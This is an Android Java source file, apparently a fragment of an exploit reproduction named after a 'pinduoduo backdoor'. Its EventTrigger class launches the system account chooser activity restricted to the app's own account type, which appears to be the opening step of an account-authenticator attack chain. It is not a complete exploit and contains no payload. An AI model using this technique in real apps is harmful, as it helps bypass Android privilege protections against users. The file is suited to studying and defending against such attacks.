package com.tech.pinduoduo_backdoor;

import android.content.Context;
import android.content.Intent;

public class EventTrigger {

    public static void trigger(Context context) {
        // 1. Trigger 1
        String account = context.getPackageName() + ".account";
        context.startActivity(new Intent()
                .setClassName("android", "android.accounts.ChooseTypeAndAccountActivity")
                .putExtra("allowableAccountTypes", new String[]{account})
        );
    }
}
